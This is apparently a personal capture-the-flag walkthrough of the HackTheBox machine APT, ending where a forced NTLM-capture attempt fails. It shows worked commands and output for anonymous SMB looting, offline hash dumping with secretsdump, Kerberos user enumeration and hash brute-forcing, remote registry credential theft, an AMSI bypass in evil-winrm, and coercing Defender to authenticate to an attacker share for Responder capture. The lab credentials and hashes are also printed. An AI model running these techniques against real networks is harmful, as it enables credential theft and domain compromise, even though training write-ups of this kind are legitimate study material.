# Shell as Henry
### RPC - TCP 135
* https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements
* https://0xdf.gitlab.io/2021/04/10/htb-apt.html#rpc---tcp-135

RPC or Remote Procedure Call, is an IPC (InterProcess Communication) mechanism which allows remote invocation of functions. This can be done locally on the server or via network clients. Distributed Component Object Model (DCOM, TCP 135) allows applications to expose objects and RPC interfaces to be invoked via RPC.
A list of available interfaces provided by DCOM can be enumerated using `impacket rpcmap.py` since `rpcclient` doesn’t do much TCP 445 or TCP 139.

```bash
impacket-rpcmap -h

Lookups listening MSRPC interfaces.

positional arguments:
  stringbinding         String binding to connect to MSRPC interface, for example:
                        ncacn_ip_tcp:192.168.0.1[135]
                        ncacn_np:192.168.0.1[\pipe\spoolss]
                        ncacn_http:192.168.0.1[593]
                        ncacn_http:[6001,RpcProxy=exchange.contoso.com:443]
                        ncacn_http:localhost[3388,RpcProxy=rds.contoso:443]
                        ```

```bash
impacket-rpcmap ncacn_ip_tcp:$IP

impacket-rpcmap ncacn_ip_tcp:$IP | grep -i 'DCOM' -A2
Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 000001A0-0000-0000-C000-000000000046 v0.0
--
Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0
--
Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
```


* https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4

This scan provided a bunch of RPC endpoints with their UUIDs, the MS-DCOM ones (Google the UUID will get it). The one shown above is the RPC interface UUID for IObjectExporter, or the IOXIDResolver. This is know that is used for the Potato exploits. 

There’s a POC script at the bottom (I added () around the print statement so it would work with modern Python), which I’ll grab and run:

### Ipv6 and then TCP 135 again
* https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc#identifying-ip-addresses
* https://github.com/A1vinSmith/IOXIDResolver

```bash
python serveralive.py
Address: apt
Address: 10.10.10.213 <- VIP+ not working, have to go with public(not private just for you) ip address
Address: dead:beef::b885:d62a:d679:573f
```

```bash
nmap -6 -p- --min-rate 10000 -oA scans/nmap-alltcp-ipv6 dead:beef::b885:d62a:d679:573f

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49691/tcp open  unknown

smbclient -L $IP_V6 --no-pass
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        backup          Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
dead:beef::b885:d62a:d679:573f is an IPv6 address -- no workgroup available

smbclient \\\\$IP_V6\\backup --no-pass
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Sep 24 19:30:52 2020
  ..                                  D        0  Thu Sep 24 19:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 19:30:32 2020

                5114623 blocks of size 4096. 2633130 blocks available
smb: \> get backup.zip
getting file \backup.zip of size 10650961 as backup.zip (1685.0 KiloBytes/sec) (average 1685.0 KiloBytes/sec)

unzip -l backup.zip
Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2020-09-23 19:40   Active Directory/
 50331648  2020-09-23 19:38   Active Directory/ntds.dit
    16384  2020-09-23 19:38   Active Directory/ntds.jfm
        0  2020-09-23 19:40   registry/
   262144  2020-09-23 19:22   registry/SECURITY
 12582912  2020-09-23 19:22   registry/SYSTEM
---------                     -------
 63193088                     6 files

john --wordlist=/usr/share/wordlists/rockyou.txt backup.zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 5 OpenMP threads
iloveyousomuch   (backup.zip)

# save it to a file, and grep to get just the hashes, and there are 2000:
❯ impacket-secretsdump -ntds backup/Active\ Directory/ntds.dit -system backup/registry/SYSTEM LOCAL > backup_ad_secretdump
❯ grep ':::' backup_ad_secretdump | wc -l

# tried taking the admin hash and logging in with crackmapexec and psexc.py, and both returned invalid credentials
```

##### Check Users
* https://0xdf.gitlab.io/2021/04/10/htb-apt.html#check-users

Offical writeup from HTB is also good this time.

With 2000 users, I need a way to check how much of this is valid. Because Kerberos is available on IPv6 (TCP 88), I can use Kerbrute to check the users. I’ll get a list of just the users. 

Also, Getting `kerbrute` to connect to an IPv6 was a bit tricky. Just putting the address in as the DC didn’t work. Eventually I got it working using the hosts file to define the IPv6 as apt.htb. My hosts file will show both apt.htb and htb.local as this IPv6.

A domain (-d) or a domain controller (--dc) must be specified. If a Domain Controller is not given the KDC will be looked up via DNS. But for IPV6, it needs both

```bash
grep ':::' backup_ad_secretdump | awk -F: '{print $1}' > users

~/kerbrute/kerbrute-arm64 userenum -d htb.local --dc apt.htb users

2023/10/30 12:57:24 >  Using KDC(s):
2023/10/30 12:57:24 >   apt.htb:88

2023/10/30 12:57:29 >  [+] VALID USERNAME:       Administrator@htb.local
2023/10/30 12:57:29 >  [+] VALID USERNAME:       APT$@htb.local
2023/10/30 13:01:41 >  [+] VALID USERNAME:       henry.vinson@htb.local
```

Only find one non-default username i.e. henry.vinson

##### Bruteuser by using a forked kerbrute
* https://github.com/ropnop/kerbrute/pull/67
```bash
~/kerbrute/kerbrute-arm64 bruteuser -d htb.local --dc apt.htb hash.list henry.vinson --etype rc4-hmac

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/31/23 - Ronnie Flathers @ropnop

2023/10/31 17:01:27 >  Using KDC(s):
2023/10/31 17:01:27 >   apt.htb:88

2023/10/31 17:01:33 >  [+] VALID LOGIN:  henry.vinson@htb.local:e53d87d42adaa3ca32bdb34a876cbffb
2023/10/31 17:01:38 >  Done! Tested 2 logins (1 successes) in 10.929 seconds
```

### Remote Access
##### From Windows
`henry.vinson` doesn’t have permissions to do WinRM and isn’t admin (so no `psexec`). Still, there are things that you can do with credentials for an unprivileged user. If I had a plaintext password, I could open a cmd windows using `runas` and the `/netonly` flag. This stores the given credentials in my local system memory as if I’m that remote user, and when I try to run something interacting with the remote domain, the credentials are validated at that DC. This terminal could be used to run commands that run on remote computers.

* https://0xdf.gitlab.io/2021/04/10/htb-apt.html#remote-access

##### From Linux
Remember we have registry files at the beginning of the scanning process. Another resource worth enumerating though is the registry. It is possible to access registry remotely with the valid credentials we have obtained.

When a user logs in, their registry hive is mounted to HKCU , which is unique to each user. However, user hives can also be accessed via the HKEY_USERS (HKU) hive. This stores registry entries for all users on the system. Impacket's reg.py can be used to enumerate the registry.

Try Impacket script, `reg.py`, which will do remote reg reads and can take a hash as auth. It took a minute to get the syntax right, and looking at the help to notice that the Current User hive is referred to as `HKU` and not `HKCU`, but it works, tho sometimes need to run multiple times

```bash
/usr/share/doc/python3-impacket/examples/reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb -dc-ip apt.htb htb.local/henry.vinson@htb.local query -keyName HKU
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU
HKU\Console
HKU\Control Panel
HKU\Environment
HKU\Keyboard Layout
HKU\Network
HKU\Software
HKU\System
HKU\Volatile Environment

/usr/share/doc/python3-impacket/examples/reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb -dc-ip apt.htb htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\SOFTWARE
HKU\SOFTWARE\GiganticHostingManagementSystem
HKU\SOFTWARE\Microsoft
HKU\SOFTWARE\Policies
HKU\SOFTWARE\RegisteredApplications
HKU\SOFTWARE\Sysinternals
HKU\SOFTWARE\VMware, Inc.
HKU\SOFTWARE\Wow6432Node
HKU\SOFTWARE\Classes

/usr/share/doc/python3-impacket/examples/reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb -dc-ip apt.htb htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE\\GiganticHostingManagementSystem
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\SOFTWARE\GiganticHostingManagementSystem
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht
```

### Shell
The `_adm` in the username suggests this account will have admin level access of some kind, and it does at least have permissions to WinRM `evil-winrm -i htb.local -u henry.vinson_adm -p 'G1#Ny5@2dvht'`

# Shell as root

### Enum

    Enumerate the directories and files for any leaked data
    Use Exploit-Suggester tools to discover the kernel vulnerabilities
    Use automation tools to perform multiple tasks like linPEAS or linenum
    Use PsPy to listen for the executed processes to watch and note if there’s any process can lead me to the root flag

```cmd powershell
*Evil-WinRM* PS C:\Program Files\Windows Defender> Bypass-4MSI
                                        
Info: Patching 4MSI, please be patient...
                                        
[+] Success!

Invoke-Binary "/home/alvin/Public/SeatbeltNet4x64.exe -group=all" <- Same method for winpeas.exe too
```

This method of running does seem to cache all the output and then dump it once the process is complete, so it can take some patience to wait for output to come. WinPEAS didn’t identify the NTLM insecurity.

After enumerating the files and directories, I’ve found `Windows Defender` directory and its executables.

```cmd powershell
*Evil-WinRM* PS C:\Program Files\Windows Defender> dir


    Directory: C:\Program Files\Windows Defender


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/21/2016   1:53 AM                en-US
d-----        9/24/2020   9:15 AM                platform
-a----        7/16/2016   2:12 PM           9398 AmMonitoringInstall.mof
-a----         1/7/2021  10:55 PM         188928 AMMonitoringProvider.dll
-a----        7/16/2016   2:12 PM          21004 AmStatusInstall.mof
-a----        7/16/2016   2:12 PM           2460 ClientWMIInstall.mof
-a----         1/7/2021  10:55 PM         306176 ConfigSecurityPolicy.exe
-a----        3/28/2017   6:23 AM         224256 DataLayer.dll
-a----        7/16/2016   2:12 PM        1514688 DbgHelp.dll
-a----        7/16/2016   2:12 PM         724480 EppManifest.dll
-a----        7/16/2016   2:12 PM            361 FepUnregister.mof
-a----         3/4/2021   5:03 AM          86528 MpAsDesc.dll
-a----         1/7/2021  10:39 PM        2630656 MpAzSubmit.dll
-a----         3/4/2021   4:55 AM         928768 MpClient.dll
-a----         3/4/2021   5:42 AM         377648 MpCmdRun.exe
```

### Strategy
The goal here is to capture a Net-NTLMv1 hash that I can send to crack.sh. Net-NTLM is a challenge response protocol, where the client (APT) reached out to the server and says “I’m ABC”, the server (in this case Responder) says “If you are ABC, prove it on this random 8-bytes”. The client does a computation using it’s NTLM hash (derived from the password), and sends it back. Assuming the legit server has access to that hash, it can verify that client did too.

Net-NTLMv1 responses (often referred to as hashes, but not really a hash) use weak crypto. crack.sh has a service for cracking them using rainbow tables. Rainbow tables are just precomputed tables of tons of possible inputs mapped the the results. For example, someone can spend months calculating a given hash of all possible inputs, and then forever use these tables to map hashes back to inputs.

Typically a way to defeat rainbow tables is to have unique salts per hash. This makes all the passwords significantly more random, and reduces the effectiveness of rainbow tables. Something like a Net-NTLM won’t work with rainbow tables if you passively capture the exchange, because there’s a unique challenge generated by the server for each connection. What crack.sh has done is create rainbow tables for the specific challenge of “1122334455667788”. In a case like this, where the server is under malicious control, it can set that challenge to always be that specific value that was used for the rainbow table generation. This is all described on the crack.sh page.

I’ll need a method to get the System account to reach out to my server so that I can capture that hash. I’ll show two.

    1. Task Defender to scan a file on a share on my host. I believe Microsoft has since disabled on demand scans of SMB shares, but it works on APT. This has the added benefits of working over SMB, so I can use responder to capture the hash, and it’s just an outbound IPv4 connection.

    2. Using Rogue Potato to generate an RPC connection. I’ll need a custom RPC server to set the specific challenge and print the result. I’ll also have to modify RoguePotato to talk IPv6, as the RPC server will need to talk back to APT on 445, which isn’t listening on IPv4

* https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/command-line-arguments-microsoft-defender-antivirus?view=o365-worldwide

I'll just go with method 1. But it doesn't work

```cmd powershell
*Evil-WinRM* PS C:\Program Files\Windows Defender> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.16.2\Public\a.txt
Scan starting...
Scan finished.
Scanning \\10.10.16.2\Public\a.txt found no threats.

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [ON]
    Force ESS downgrade        [ON]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.2]
    Responder IPv6             [dead:beef:4::1000]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-JZLVHU90ZR5]
    Responder Domain Name      [BZWB.LOCAL]
    Responder DCE-RPC Port     [48983]

[+] Listening for events...

NO RESPONSE!!
```
